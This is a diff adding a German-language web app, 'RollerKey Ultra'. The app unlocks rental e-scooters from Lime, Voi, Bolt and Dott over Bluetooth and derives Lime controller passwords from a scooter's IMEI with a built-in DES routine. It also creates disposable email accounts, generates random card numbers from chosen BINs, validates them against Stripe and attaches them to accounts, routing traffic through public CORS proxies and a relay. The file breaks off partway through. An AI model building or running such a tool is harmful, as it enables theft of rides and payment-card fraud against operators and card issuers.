@@ -1,0 +1,2207 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="theme-color" content="#000000">
+<title>RollerKey Ultra</title>
+<link rel="manifest" href="manifest.json">
+<link rel="icon" href="icon.svg">
+<link rel="apple-touch-icon" href="icon.svg">
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{touch-action:manipulation;-webkit-text-size-adjust:100%;overscroll-behavior:none}
+html,body{margin:0;padding:0;background:#000;color:#4dffa0;
+  font:16px/1.55 ui-monospace,SFMono-Regular,Menlo,monospace}
+body{padding:16px 16px 60px;max-width:680px;margin:0 auto;touch-action:pan-y}
+h1{font-size:17px;letter-spacing:.2em;margin:0 0 4px;font-weight:700}
+h1 span{color:#1f8a4d;font-weight:400}
+#status{margin:6px 0 16px;font-size:14px;color:#2f9a5e;min-height:42px}
+#status.ok{color:#4dffa0}#status.warn{color:#ffcf4d}#status.err{color:#ff6b6b}
+section{border:1px solid #12492a;border-radius:14px;padding:16px;margin:0 0 16px;background:#04100a}
+section.hot{border-color:#2f9a5e;background:#06190e}
+h2{font-size:13px;letter-spacing:.18em;color:#2f9a5e;margin:0 0 14px;font-weight:700}
+.row{display:flex;justify-content:space-between;gap:12px;font-size:14px;padding:7px 0;
+  border-bottom:1px dotted #12492a}
+.row:last-of-type{border-bottom:0}
+.row span{color:#2f9a5e}
+.row b{color:#4dffa0;font-weight:600;text-align:right;word-break:break-all}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px}
+button{font:inherit;font-size:14px;font-weight:600;letter-spacing:.1em;padding:15px 10px;
+  border-radius:11px;background:#06190e;color:#4dffa0;border:1px solid #12492a;cursor:pointer;
+  touch-action:manipulation}
+button:active{background:#0a2a16}
+button:disabled{opacity:.3}
+button.wide{grid-column:1/-1}
+button.big{padding:26px 10px;font-size:18px;letter-spacing:.2em;border-color:#2f9a5e}
+button.danger{color:#ffa0a0;border-color:#5c1414;background:#1a0404}
+input,select{width:100%;font:inherit;font-size:16px;padding:14px;border-radius:11px;
+  background:#04100a;color:#4dffa0;border:1px solid #12492a;margin-top:10px}
+input::placeholder{color:#1f6b3b}
+#log{font-size:13px;line-height:1.6;height:190px;overflow:auto;background:#010805;
+  border:1px solid #12492a;border-radius:10px;padding:10px;white-space:pre-wrap;
+  word-break:break-all;-webkit-overflow-scrolling:touch}
+#log div{color:#2f9a5e}
+#log div.g{color:#4dffa0}
+#log div.y{color:#ffcf4d}
+#log div.e{color:#ff6b6b}
+#log div.h{color:#9dffca}
+.hint{font-size:13px;color:#2f9a5e;margin-top:12px;line-height:1.6}
+.hint b{color:#ffcf4d;font-weight:600}
+#qr{display:none;margin-top:10px}
+video{width:100%;border-radius:10px;background:#000}
+#qrbox{font-size:13px;color:#2f9a5e;margin-top:10px;word-break:break-all;min-height:16px}
+#bt{font-size:14px;margin-top:10px;color:#2f9a5e}
+#bt.on{color:#4dffa0}
+hr{border:0;border-top:1px dotted #12492a;margin:16px 0}
+.brands{display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:6px;margin-top:12px}
+.brands button{padding:12px 2px;font-size:12px;opacity:.45}
+.brands button.on{opacity:1;border-color:#4dffa0;background:#0a2a16}
+.card{position:relative;border-radius:18px;padding:18px;margin-top:12px;overflow:hidden;
+  background:radial-gradient(120% 90% at 88% 6%,rgba(77,255,160,.22),transparent 58%),
+  linear-gradient(140deg,#0a3a22 0%,#06190e 46%,#0d4a28 100%);
+  border:1px solid #2f9a5e;box-shadow:0 8px 24px rgba(0,0,0,.7)}
+.card::after{content:"";position:absolute;inset:0;pointer-events:none;
+  background:repeating-linear-gradient(115deg,transparent 0 22px,rgba(77,255,160,.05) 22px 23px)}
+.card.off{opacity:.4;filter:saturate(.4)}
+.card.voll{border-color:#ffcf4d}
+.crow{display:flex;align-items:center;justify-content:space-between}
+.chip{width:38px;height:28px;border-radius:6px;
+  background:linear-gradient(135deg,#d8ffd0,#4d8f5f 55%,#9fe8ad)}
+.brand{font-style:italic;font-weight:700;letter-spacing:.16em;font-size:16px;color:#9dffca}
+.cnum{margin:18px 0 14px;font-size:17px;letter-spacing:.14em;color:#e2ffef;word-spacing:.3em}
+.cfoot{display:flex;justify-content:space-between;align-items:flex-end;gap:10px}
+.clab{font-size:11px;letter-spacing:.14em;color:#39a866}
+.cval{font-size:13px;color:#b6ffd4;margin-top:2px}
+.camt{text-align:right}
+.camt .cval{font-size:17px;color:#4dffa0}
+#cstat{font-size:13px;margin-top:10px;color:#2f9a5e;min-height:34px;line-height:1.5}
+#cstat.g{color:#4dffa0}#cstat.e{color:#ff6b6b}
+.bar{height:10px;border-radius:6px;background:#0a2a16;overflow:hidden;margin-top:10px;
+  border:1px solid #12492a}
+.bar i{display:block;height:100%;width:0%;background:#4dffa0;transition:width .4s}
+.bar i.warn{background:#ffcf4d}
+.bar i.voll{background:#ff6b6b}
+.zeit{font-size:30px;text-align:center;color:#1f6b3b;font-variant-numeric:tabular-nums;
+  font-weight:700;margin-top:10px}
+.zeit.on{color:#4dffa0}
+details{border:1px solid #12492a;border-radius:12px;padding:14px;background:#04100a;
+  margin-bottom:16px}
+summary{font-size:13px;letter-spacing:.14em;color:#2f9a5e;font-weight:700;cursor:pointer;
+  list-style:none}
+summary::-webkit-details-marker{display:none}
+summary::before{content:"+ ";color:#4dffa0}
+details[open] summary::before{content:"− "}
+textarea{width:100%;font:inherit;font-size:11px;line-height:1.45;padding:10px;border-radius:8px;
+  background:#000;color:#2f9a5e;border:1px solid #12492a;margin-top:10px;height:150px}
+</style>
+</head>
+<body>
+
+<h1>ROLLERKEY <span>ULTRA</span></h1>
+<div id="status">startet …</div>
+
+<section class="hot">
+  <h2>ROLLER</h2>
+  <div id="bt">nicht verbunden</div>
+  <div class="brands">
+    <button data-b="lime" class="on">LIME</button>
+    <button data-b="voi">VOI</button>
+    <button data-b="bolt">BOLT</button>
+    <button data-b="dott">DOTT</button>
+  </div>
+  <div class="grid">
+    <button class="wide big" id="bUnlock">ENTSPERREN</button>
+    <button id="bLock">SPERREN</button>
+    <button id="bBeep">PIEPS</button>
+    <button id="bBat">AKKU</button>
+    <button id="bConn">VERBINDEN</button>
+    <button id="bLight">LICHT</button>
+    <button class="wide" id="bScan">QR SCANNEN</button>
+  </div>
+  <div id="qr">
+    <video id="vid" playsinline muted></video>
+    <div class="grid"><button class="wide" id="bQrClose">KAMERA ZU</button></div>
+  </div>
+  <div id="qrbox"></div>
+  <div class="hint">Marke wählen, verbinden, dann entsperren. Bei <b>Lime</b> nach dem Verbinden
+  <b>3 Sekunden warten</b> — der Controller braucht das. Bei <b>Voi / Bolt / Dott</b> läuft es über
+  das Okai-Protokoll, da ist kein Warten nötig.</div>
+</section>
+
+<section>
+  <h2>KONTO + KARTE</h2>
+  <div class="row"><span>Sitzung</span><b id="uSitz">–</b></div>
+  <div class="row"><span>Konto</span><b id="uMail">–</b></div>
+  <div class="row"><span>Postfach</span><b id="uPost">–</b></div>
+  <div class="row"><span>Karte am Konto</span><b id="uAn">–</b></div>
+  <div class="row"><span>Belastung</span><b id="uLast">0,00 €</b></div>
+  <div class="row"><span>Grenze</span><b id="uLimit">50,00 €</b></div>
+  <div class="bar"><i id="cBar"></i></div>
+  <div class="zeit" id="uZeit">00:00</div>
+  <div class="grid">
+    <button class="wide big" id="bStart">ALLES ANLEGEN</button>
+    <button id="bMail">MAIL ANSEHEN</button>
+    <button id="bFachNeu">POSTFACH NEU</button>
+    <button class="wide" id="bKomplett" >KOMPLETT NEU</button>
+    <button id="bMe">PRÜFEN</button>
+    <button id="bDel" class="danger">KONTO LÖSCHEN</button>
+  </div>
+  <input id="iLink" placeholder="magic-link oder Token einfügen" autocapitalize="off">
+  <div class="grid">
+    <button class="wide" id="bLink">LINK EINLÖSEN</button>
+  </div>
+  <div id="cstat"></div>
+  <div class="hint">Konto und Karte gelten nur für Lime. Voi, Bolt und Dott laufen rein über Bluetooth.</div>
+</section>
+
+<section>
+  <h2>KARTE</h2>
+  <div class="card off" id="cardBox">
+    <div class="crow"><span class="chip"></span><span class="brand" id="cBrand">LEER</span></div>
+    <div class="cnum" id="cNum">•••• •••• •••• ••••</div>
+    <div class="cfoot">
+      <div><div class="clab">GÜLTIG</div><div class="cval" id="cExp">--/--</div></div>
+      <div><div class="clab">CVV</div><div class="cval" id="cCvv">---</div></div>
+      <div class="camt"><div class="clab">REST</div><div class="cval" id="cLimit">50,00 €</div></div>
+    </div>
+  </div>
+  <div class="grid">
+    <button id="bBin">BIN TAUSCHEN</button>
+    <button id="bNeu">KARTE WÜRFELN</button>
+    <input id="iBin" placeholder="eigene BIN, 6 bis 8" inputmode="numeric" maxlength="8">
+    <button id="bBinUse">BIN VERWENDEN</button>
+    <button class="wide" id="bPruefCard">KARTE PRÜFEN</button>
+    <button class="wide" id="bAnhaengen">AM KONTO ANHÄNGEN</button>
+    <button class="wide danger" id="bCardDel">KARTE LÖSCHEN</button>
+  </div>
+  <div class="hint">Prüfen zeigt, ob Stripe die Karte annimmt. Erst prüfen, dann anhängen, dann buchen.</div>
+</section>
+
+<section>
+  <h2>FAHRTENBUCH</h2>
+  <div id="log"></div>
+  <div class="grid">
+    <button id="bLeer">LEEREN</button>
+    <button id="bDiag">DIAGNOSE</button>
+    <button class="wide" id="bPruef">SELBSTPRÜFUNG</button>
+  </div>
+</section>
+
+<details>
+  <summary>ERWEITERT</summary>
+  <hr>
+  <span class="hint">Die IMEI steht auf dem Aufkleber am Trittbrett (15 Ziffern). Damit rechnet die App
+  das Lime-Anmeldepasswort. Nur nötig, wenn der Roller auf die Rahmen nicht reagiert.</span>
+  <input id="iImei" placeholder="IMEI, 15 Ziffern" inputmode="numeric" maxlength="15">
+  <div class="grid">
+    <button id="bImei">PASSWORT RECHNEN</button>
+    <button id="bAuth">ANMELDEN</button>
+  </div>
+  <div id="pwAus" class="hint"></div>
+  <hr>
+  <span class="hint">Kanal nur umstellen, wenn die Diagnose mehrere zeigt und der erste nicht wirkt.</span>
+  <select id="iKanal"><option value="">automatisch</option></select>
+  <hr>
+  <span class="hint">Postfach-Anbieter. Bei „keine Mail" hier einen anderen wählen.</span>
+  <select id="iFach">
+    <option value="">automatisch</option>
+    <option value="mail.tm">mail.tm</option>
+    <option value="mail.gw">mail.gw</option>
+    <option value="guerrilla">guerrilla</option>
+    <option value="catchmail">catchmail</option>
+  </select>
+  <hr>
+  <span class="hint"><b>Empfohlen:</b> Relay. Ohne Relay tragen Anmeldungen oft nicht.</span>
+  <input id="iRelay" placeholder="https://relay.name.workers.dev/?url=" autocapitalize="off">
+  <div class="grid">
+    <button id="bSaveRelay">SPEICHERN</button>
+    <button id="bRelayDel">LÖSCHEN</button>
+    <button class="wide" id="bNet">NETZ TESTEN</button>
+    <button class="wide" id="bFrei">SPERREN AUFHEBEN</button>
+  </div>
+  <button class="wide" id="bCopyW">WORKER-CODE KOPIEREN</button>
+  <textarea id="workerCode" readonly spellcheck="false"></textarea>
+  <hr>
+  <span class="hint">OKAI-TESTMODUS und freie Rahmen</span>
+  <div class="grid">
+    <button id="bTest">TESTMODUS</button>
+    <button id="bOkaiUn">OKSCM 0</button>
+    <button id="bOkaiLk">OKSCM 1</button>
+    <button id="bOkaiBat">OKBCL</button>
+  </div>
+  <hr>
+  <span class="hint">BLE-KONSOLE</span>
+  <input id="iSvc" placeholder="Dienst-UUID">
+  <input id="iCh" placeholder="Kanal-UUID">
+  <input id="iRaw" placeholder="Hex oder Text">
+  <button class="wide" id="bRaw">ROH SENDEN</button>
+  <hr>
+  <span class="hint">Handynummer nur für Voi und Bolt.</span>
+  <input id="iPhone" placeholder="+49 151 2345678" inputmode="tel">
+  <div class="grid">
+    <button id="bPhone">KONTO ANLEGEN</button>
+    <button id="bOtp">CODE SENDEN</button>
+  </div>
+  <input id="iOtp" placeholder="SMS-Code oder Token" inputmode="numeric">
+  <hr>
+  <span class="hint">STRIPE-SCHLÜSSEL — wird normalerweise selbst gefunden.</span>
+  <input id="iPk" placeholder="pk_live_…" autocapitalize="off">
+  <button class="wide" id="bPk">SCHLÜSSEL SPEICHERN</button>
+  <hr>
+  <button class="wide danger" id="bReset">ALLES ZURÜCKSETZEN</button>
+</details>
+
+<script>
+"use strict";
+
+const $ = id => document.getElementById(id);
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const rnd = n => Array.from({length:n},
+  () => "abcdefghijkmnpqrstuvwxyz23456789"[Math.floor(Math.random()*32)]).join("");
+const num = n => Array.from({length:n}, () => String(Math.floor(Math.random()*10))).join("");
+const kurz = e => String(e && e.message ? e.message : e).slice(0, 90);
+const saub = t => String(t || "").replace(/\s+/g, " ").trim().slice(0, 60);
+const euro = c => (Math.max(0, Math.round(c)) / 100).toFixed(2).replace(".", ",") + " €";
+const hex = b => {
+  if (!b) return "";
+  const a = b instanceof ArrayBuffer ? new Uint8Array(b)
+    : (b.buffer ? new Uint8Array(b.buffer, b.byteOffset, b.byteLength) : new Uint8Array(b));
+  return [...a].map(x => x.toString(16).padStart(2, "0")).join(" ");
+};
+
+const PRE = "rk_";
+const ls = (k, v) => { try { localStorage.setItem(PRE + k, JSON.stringify(v)) } catch(_){} };
+const lg = (k, d) => { try { const v = localStorage.getItem(PRE + k); return v === null ? d : JSON.parse(v) } catch(_){ return d } };
+const lw = k => { try { localStorage.removeItem(PRE + k) } catch(_){} };
+
+let DEV = lg("dev", null);
+if (!DEV){
+  DEV = (crypto.randomUUID ? crypto.randomUUID() : rnd(8) + "-" + Date.now());
+  ls("dev", DEV);
+}
+function devNeu(){
+  DEV = crypto.randomUUID ? crypto.randomUUID() : rnd(8) + "-" + Date.now();
+  ls("dev", DEV);
+}
+
+const LIMIT = 5000, START_EUR = 100, MIN_EUR = 15;
+let MAILTEXT = "";
+
+const S = {
+  brand:"lime", karten:{}, pk:{}, keyOk:"", acct:{}, fach:{}, tot:{}, fehler:{}, gut:"",
+  hostTot:{}, relay:"", prov:false, fachLauf:false, erneuert:false, pw:"", pwU:"", imei:"",
+  seq:0, okseq:0, srv:null, dev:null, chans:[], best:null, antworten:0, gesamt:0, puffer:[],
+  offen:false, akku:null, okai:false, cam:null, t0:0, ping:0, angemeldet:false, licht:false,
+  fahrt:{ start:0, laufend:false, timer:0 }
+};
+
+function log(t, k){
+  const d = document.createElement("div");
+  d.className = k || "";
+  d.textContent = new Date().toLocaleTimeString("de-DE") + "  " + t;
+  $("log").appendChild(d);
+  $("log").scrollTop = 1e9;
+  while ($("log").children.length > 400) $("log").removeChild($("log").firstChild);
+}
+const stat = (t, k) => { $("status").textContent = t; $("status").className = k || "" };
+const cstat = (t, k) => { $("cstat").textContent = t; $("cstat").className = k || "" };
+
+(function(){
+  let letzter = 0;
+  document.addEventListener("touchend", e => {
+    const jetzt = Date.now();
+    if (jetzt - letzter < 320 && e.touches.length === 0){
+      if (!e.target.closest("input,textarea,select")) e.preventDefault();
+    }
+    letzter = jetzt;
+  }, { passive:false });
+  ["gesturestart", "gesturechange", "gestureend"].forEach(n =>
+    document.addEventListener(n, e => e.preventDefault(), { passive:false }));
+})();
+
+/* ═══════ NETZ ═══════ */
+
+const POSTWEGE = [
+  { n:"corsmirror",  f: u => "https://corsmirror.com/v1?url=" + encodeURIComponent(u) },
+  { n:"x2u",         f: u => "https://cors.x2u.in/" + u },
+  { n:"codetabs",    f: u => "https://api.codetabs.com/v1/proxy?quest=" + encodeURIComponent(u) },
+  { n:"cf-anywhere", f: u => "https://test.cors.workers.dev/?" + u },
+  { n:"cors.dev",    f: u => "https://proxy.cors.dev/" + u, auth:false },
+  { n:"corsproxy",   f: u => "https://corsproxy.io/?url=" + encodeURIComponent(u) }
+];
+const GETWEGE = [
+  { n:"corsmirror",  f: u => "https://corsmirror.com/v1?url=" + encodeURIComponent(u) },
+  { n:"x2u",         f: u => "https://cors.x2u.in/" + u },
+  { n:"codetabs",    f: u => "https://api.codetabs.com/v1/proxy?quest=" + encodeURIComponent(u) },
+  { n:"cf-anywhere", f: u => "https://test.cors.workers.dev/?" + u },
+  { n:"cors.dev",    f: u => "https://proxy.cors.dev/" + u, auth:false },
+  { n:"allorigins",  f: u => "https://api.allorigins.win/raw?url=" + encodeURIComponent(u) }
+];
+
+const CORS_OK = ["api.mail.tm", "api.mail.gw", "api.guerrillamail.com",
+                 "api.stripe.com", "api.catchmail.io"];
+
+const MUELL = /invalid_origin|domain_not_registered|too many requests|rate limit|bad gateway|just a moment|access denied|missing_api_key|api key required|not allowed/i;
+
+const gesperrt = n => (S.tot[n] || 0) > Date.now();
+const sperre = (n, ms) => { S.tot[n] = Date.now() + ms };
+
+function daneben(n){
+  S.fehler[n] = (S.fehler[n] || 0) + 1;
+  if (S.fehler[n] >= 2) sperre(n, n === "relay" ? 8000 : 20000);
+}
+function gutGelaufen(n){
+  S.fehler[n] = 0;
+  S.tot[n] = 0;
+  if (S.gut !== n){ S.gut = n; ls("gut", n) }
+}
+
+function wege(post, url, auth){
+  const l = [];
+  let host = "";
+  try { host = new URL(url).hostname } catch(_){}
+  const direkt = { n:"direkt", f: u => u };
+  const eigen = CORS_OK.indexOf(host) >= 0;
+
+  if (S.relay) l.push({ n:"relay", f: u => S.relay + encodeURIComponent(u) });
+  if (eigen) l.push(direkt);
+
+  const liste = (post ? POSTWEGE : GETWEGE)
+    .filter(w => !auth || w.auth !== false)
+    .slice();
+  liste.sort((a, b) => (a.n === S.gut ? -1 : b.n === S.gut ? 1 : 0));
+  for (const w of liste) l.push(w);
+
+  if (!eigen) l.push(direkt);
+  return l;
+}
+
+function echt(res, text){
+  const t = (text || "").trim();
+  if (res.status < 400) return true;
+  if ([400, 404, 409, 422].indexOf(res.status) >= 0) return true;
+  if ([401, 403, 405, 429].indexOf(res.status) >= 0){
+    if (/^[\[{]/.test(t)) return true;
+    if (t.length > 250 && !MUELL.test(t)) return true;
+    return false;
+  }
+  return false;
+}
+
+async function roh(url, o){
+  o = o || {};
+  const post = (o.method || "GET").toUpperCase() !== "GET";
+  const auth = !!(o.headers && o.headers.Authorization);
+  const reihe = wege(post, url, auth);
+
+  if (reihe.every(w => gesperrt(w.n))){
+    S.tot = {}; S.fehler = {};
+    log("alle Wege gesperrt · Sperren aufgehoben", "y");
+  }
+
+  let last = null, probiert = 0;
+
+  for (const w of reihe){
+    if (gesperrt(w.n)) continue;
+    probiert++;
+    try {
+      const ctl = new AbortController();
+      const t = setTimeout(() => ctl.abort(), o.frist || 15000);
+      const res = await fetch(w.f(url), {
+        method: o.method || "GET",
+        headers: o.headers || {},
+        body: o.body,
+        signal: ctl.signal,
+        redirect: "follow"
+      });
+      clearTimeout(t);
+      const text = await res.text();
+
+      const eigenerFehler = (res.status === 502 && /relay_fail/.test(text));
+      const traegt = w.n === "relay"
+        ? !eigenerFehler
+        : (echt(res, text) && !MUELL.test(text.slice(0, 200)));
+
+      if (!traegt){
+        daneben(w.n);
+        log("Weg " + w.n + " taugt nicht · HTTP " + res.status, "y");
+        last = new Error("Weg " + w.n + " taugt nicht");
+        continue;
+      }
+      gutGelaufen(w.n);
+      let json = null;
+      try { json = JSON.parse(text) } catch(_){}
+      return { ok: res.ok, status: res.status, text: text, json: json, weg: w.n };
+    } catch(e){
+      daneben(w.n);
+      log("Weg " + w.n + " · " + kurz(e), "y");
+      last = e;
+    }
+  }
+  if (!probiert) throw new Error(auth && !S.relay
+    ? "alle Wege gesperrt oder ohne Anmeldung · RELAY einrichten"
+    : "alle Wege gesperrt · SPERREN AUFHEBEN");
+  throw last || new Error("kein Weg frei");
+}
+
+function H(t){
+  const h = { "Content-Type":"application/json", "Accept":"application/json",
+    "Platform":"Android", "App-Version":"3.248.1", "X-Device-Token":DEV };
+  if (t) h["Authorization"] = "Bearer " + t;
+  return h;
+}
+const J = b => JSON.stringify(b);
+
+function HF(t){
+  const h = H(t);
+  h["Content-Type"] = "application/x-www-form-urlencoded";
+  return h;
+}
+const F = o => new URLSearchParams(o).toString();
+
+/* ═══════ DES ═══════ */
+
+const DES = (() => {
+  const PC1=[57,49,41,33,25,17,9,1,58,50,42,34,26,18,10,2,59,51,43,35,27,19,11,3,
+             60,52,44,36,63,55,47,39,31,23,15,7,62,54,46,38,30,22,14,6,61,53,45,37,
+             29,21,13,5,28,20,12,4];
+  const PC2=[14,17,11,24,1,5,3,28,15,6,21,10,23,19,12,4,26,8,16,7,27,20,13,2,
+             41,52,31,37,47,55,30,40,51,45,33,48,44,49,39,56,34,53,46,42,50,36,29,32];
+  const IP=[58,50,42,34,26,18,10,2,60,52,44,36,28,20,12,4,62,54,46,38,30,22,14,6,
+            64,56,48,40,32,24,16,8,57,49,41,33,25,17,9,1,59,51,43,35,27,19,11,3,
+            61,53,45,37,29,21,13,5,63,55,47,39,31,23,15,7];
+  const FP=[40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31,38,6,46,14,54,22,62,30,
+            37,5,45,13,53,21,61,29,36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27,
+            34,2,42,10,50,18,58,26,33,1,41,9,49,17,57,25];
+  const E=[32,1,2,3,4,5,4,5,6,7,8,9,8,9,10,11,12,13,12,13,14,15,16,17,
+           16,17,18,19,20,21,20,21,22,23,24,25,24,25,26,27,28,29,28,29,30,31,32,1];
+  const P=[16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10,2,8,24,14,32,27,3,9,
+           19,13,30,6,22,11,4,25];
+  const SH=[1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1];
+  const SB=[
+   [14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7, 0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8,
+    4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0, 15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13],
+   [15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10, 3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5,
+    0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15, 13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9],
+   [10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8, 13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1,
+    13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7, 1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12],
+   [7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15, 13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9,
+    10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4, 3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14],
+   [2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9, 14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6,
+    4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14, 11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3],
+   [12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11, 10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8,
+    9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6, 4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13],
+   [4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1, 13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6,
+    1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2, 6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12],
+   [13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7, 1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2,
+    7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8, 2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11]
+  ];
+
+  const perm = (b, t) => t.map(i => b[i-1]);
+  const schub = (b, n) => b.slice(n).concat(b.slice(0, n));
+  const zuBits = a => { const o = [];
+    for (const x of a) for (let i = 7; i >= 0; i--) o.push((x >> i) & 1); return o };
+  const zuBytes = b => { const o = new Uint8Array(b.length / 8);
+    for (let i = 0; i < o.length; i++){
+      let v = 0;
+      for (let j = 0; j < 8; j++) v = (v << 1) | b[i*8+j];
+      o[i] = v;
+    }
+    return o };
+
+  function block(schluessel, daten){
+    const k = perm(zuBits(schluessel), PC1);
+    let c = k.slice(0, 28), d = k.slice(28);
+    const runden = [];
+    for (let r = 0; r < 16; r++){
+      c = schub(c, SH[r]);
+      d = schub(d, SH[r]);
+      runden.push(perm(c.concat(d), PC2));
+    }
+    const b = perm(zuBits(daten), IP);
+    let L = b.slice(0, 32), R = b.slice(32);
+    for (let r = 0; r < 16; r++){
+      const x = perm(R, E).map((v, i) => v ^ runden[r][i]);
+      const s = [];
+      for (let i = 0; i < 8; i++){
+        const q = x.slice(i*6, i*6+6);
+        const zeile = (q[0] << 1) | q[5];
+        const spalte = (q[1] << 3) | (q[2] << 2) | (q[3] << 1) | q[4];
+        const v = SB[i][zeile*16 + spalte];
+        s.push((v >> 3) & 1, (v >> 2) & 1, (v >> 1) & 1, v & 1);
+      }
+      const f = perm(s, P);
+      const nR = L.map((v, i) => v ^ f[i]);
+      L = R;
+      R = nR;
+    }
+    return zuBytes(perm(R.concat(L), FP));
+  }
+
+  const vonHex = h => new Uint8Array(h.match(/../g).map(x => parseInt(x, 16)));
+  const nachHex = a => [...a].map(x => x.toString(16).padStart(2, "0")).join("").toUpperCase();
+  const SCHLUESSEL = new Uint8Array([0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88]);
+
+  function selbsttest(){
+    const v = [
+      ["0123456789ABCDEF", "4E6F772069732074", "3FA40E8A984D4815"],
+      ["133457799BBCDFF1", "0123456789ABCDEF", "85E813540F0AB405"]
+    ];
+    let gut = 0;
+    for (const [k, d, soll] of v){
+      if (nachHex(block(vonHex(k), vonHex(d))) === soll) gut++;
+    }
+    return { gut:gut, soll:v.length };
+  }
+
+  function passwort(imei){
+    const t = new TextEncoder().encode(String(imei).replace(/\D/g, "").padEnd(16, "0").slice(0, 16));
+    return nachHex(block(SCHLUESSEL, t).slice(4));
+  }
+
+  return { block:block, selbsttest:selbsttest, passwort:passwort,
+           schluessel:SCHLUESSEL, vonHex:vonHex, nachHex:nachHex };
+})();
+
+/* ═══════ POSTFÄCHER ═══════ */
+
+const GU = "https://api.guerrillamail.com/ajax.php";
+
+function guLesen(sid){
+  let n = 0;
+  return async () => {
+    n++;
+    const c = await roh(GU + "?f=check_email&seq=" + n + "&sid_token=" + encodeURIComponent(sid));
+    const m = c.json && c.json.list && c.json.list[0];
+    if (!m) return "";
+    const f = await roh(GU + "?f=fetch_email&email_id=" + encodeURIComponent(m.mail_id) +
+      "&sid_token=" + encodeURIComponent(sid));
+    return [f.json && f.json.mail_subject, f.json && f.json.mail_body,
+            f.json && f.json.mail_excerpt, f.text].filter(Boolean).join(" ");
+  };
+}
+
+async function fachGuerrilla(){
+  const r = await roh(GU + "?f=get_email_address&lang=de&ip=127.0.0.1&agent=rollerkey");
+  const j = r.json;
+  if (!j || !j.email_addr) throw new Error("guerrilla " + r.status);
+  const sid = j.sid_token || "";
+  if (!sid) throw new Error("guerrilla ohne Sitzung");
+  ls("fach_" + S.brand, { adr:j.email_addr, sid:sid, art:"gu" });
+  return { adr:j.email_addr, lesen:guLesen(sid) };
+}
+
+async function fachCatch(){
+  const doms = ["catchmail.io", "mailistry.com", "zeppost.com"];
+  const dom = doms[Math.floor(Math.random() * doms.length)];
+  const adr = "rk" + rnd(10) + "@" + dom;
+  const basis = "https://api.catchmail.io/api/v1/";
+  const lesen = async () => {
+    const r = await roh(basis + "mailbox?address=" + encodeURIComponent(adr));
+    const m = r.json && r.json.messages && r.json.messages[0];
+    if (!m) return "";
+    const v = await roh(basis + "message/" + encodeURIComponent(m.id) +
+      "?mailbox=" + encodeURIComponent(adr));
+    const j = v.json || {};
+    return [m.subject, j.body && j.body.text, j.body && j.body.html, v.text]
+      .filter(Boolean).join(" ");
+  };
+  ls("fach_" + S.brand, { adr:adr, art:"catch" });
+  return { adr:adr, lesen:lesen };
+}
+
+function hydraLesen(host, tok){
+  return async () => {
+    const r = await roh("https://" + host + "/messages", { headers:H(tok) });
+    const m = r.json && r.json["hydra:member"] && r.json["hydra:member"][0];
+    if (!m) return "";
+    const v = await roh("https://" + host + "/messages/" + m.id, { headers:H(tok) });
+    const j = v.json || {};
+    return [j.subject, j.text, j.html && j.html.join ? j.html.join(" ") : j.html,
+            v.text].filter(Boolean).join(" ");
+  };
+}
+
+function fachHydra(host){
+  return async () => {
+    if ((S.hostTot[host] || 0) > Date.now()) throw new Error(host + " wartet noch");
+    const d = await roh("https://" + host + "/domains");
+    if (d.status === 429 || d.status >= 500){
+      S.hostTot[host] = Date.now() + (d.status === 429 ? 90000 : 120000);
+      throw new Error(host + " " + d.status);
+    }
+    const liste = (d.json && d.json["hydra:member"]) || [];
+    if (!liste.length) throw new Error("keine Domain");
+    const dom = liste[Math.floor(Math.random() * liste.length)].domain;
+    const adr = rnd(10) + "@" + dom;
+    const pw = rnd(14);
+    const c = await roh("https://" + host + "/accounts",
+      { method:"POST", headers:H(), body:J({ address:adr, password:pw }) });
+    if (!c.ok || !c.json){
+      if (c.status === 429) S.hostTot[host] = Date.now() + 90000;
+      throw new Error(host + " " + c.status);
+    }
+    const t = await roh("https://" + host + "/token",
+      { method:"POST", headers:H(), body:J({ address:adr, password:pw }) });
+    const tok = t.json && t.json.id;
+    if (!tok) throw new Error("kein Token");
